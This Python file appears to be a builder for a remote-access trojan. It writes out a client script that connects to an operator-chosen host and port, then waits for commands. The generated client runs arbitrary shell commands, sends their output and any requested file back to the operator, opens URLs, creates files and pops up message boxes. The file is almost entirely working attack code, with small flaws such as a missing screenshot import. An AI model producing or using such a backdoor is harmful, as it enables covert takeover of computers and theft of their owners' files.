import string
import os

def create_file(host, port):
	add = "haha"
	type_text = '''import socket
import subprocess
import os
import sys
import platform
from curiosity_univ import client_plat
from curiosity_univ import open_url
from curiosity_win import msgbox
from curiosity_univ.file_transfer import client

global y
y = socket.socket()
y.connect((''' +  '"%s"' % host + ''', ''' + str(port) + '''))
while True:
	recieved = ((y.recv(1024)).decode('utf-8'))
	print(recieved)
		
	if len(recieved) > 0:
		if(recieved) == 'platform':
			client_plat.Main(y)
		elif (recieved) == 'cmd':
			recieved = (y.recv(1024).decode('utf-8'))
			if len(recieved) > 0:
				print(recieved)
				if recieved[:5] == 'mkdir':
					cmd = subprocess.Popen(recieved, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
					y.send(("Made Directory").encode('utf-8'))

				else:
					cmd = subprocess.Popen(recieved, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
					out_string = cmd.stdout.read()
					y.send(out_string)
		elif (recieved) == 'terminate':
			y.close()
		elif (recieved) == 'create':
			recieved = ((y.recv(1024)).decode('utf-8'))
			if(recieved) == 'file':
				cwd = os.getcwd()
				second_recieved = ((y.recv(1024)).decode('utf-8'))
				print(second_recieved)
				file = open(cwd + "\\\\" + second_recieved + ".txt", "w")
				y.send(("Created File").encode('utf-8'))
		elif (recieved) == 'msgbox':
			title = (y.recv(1024).decode('utf-8'))
			text = (y.recv(1024).decode('utf-8'))
			box = msgbox.Mbox(title, text, 1)
			msgbox.Mbox.create_box(box)
		elif (recieved) == 'open url':
			open_url.client(y)
		elif (recieved) == 'screenshot':
			screenshot.client(y)
		elif (recieved) == 'transfer':
			file_location = ((y.recv(1024)).decode('utf-8'))
			print(file_location)
			f = open(file_location, 'rb')
			file_size = str(os.stat(file_location).st_size)
			print(file_size)
			int_file_size = int(file_size)
			print(int_file_size)
			y.send((file_size).encode('utf-8'))
			while (int_file_size) > 0:
				l = f.read(1024)
				print('sending')
				y.send(l)
				int_file_size -= 1024
			f.close()
			print("Finished")'''

	return(type_text)

def second(host, port):
	cwd = os.getcwd()
	selected_name = raw_input("Enter Client File Name > ")
	file = open(cwd + '/' + selected_name + '.py', 'w')
	file.write(create_file(host, int(port)))
	file.close()